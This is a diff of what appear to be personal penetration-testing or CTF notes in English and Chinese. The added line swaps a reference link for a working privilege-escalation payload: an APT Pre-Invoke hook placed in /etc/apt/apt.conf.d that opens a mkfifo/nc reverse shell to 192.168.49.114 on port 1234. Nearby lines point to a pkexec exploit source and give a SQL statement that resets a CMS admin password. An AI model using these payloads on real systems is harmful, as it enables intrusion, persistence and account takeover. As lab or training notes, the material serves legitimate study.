@@ -161,7 +161,7 @@
 13. Flask = Python + Werkzeug
 14. Gobuster vhost 扫描域名。
 15. https://haxx.in/files/blasty-vs-pkexec.c
-16. apt get crontab:https://systemweakness.com/code-execution-with-apt-update-in-crontab-privesc-in-linux-e6d6ffa8d076
+16. apt get crontab: payload - echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.114 1234 >/tmp/f"};' > shell and put it under /etc/apt/apt.conf.d
 
 **Mysql**
 1. update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'admin'))) where username = 'admin'; root用户修改密码。
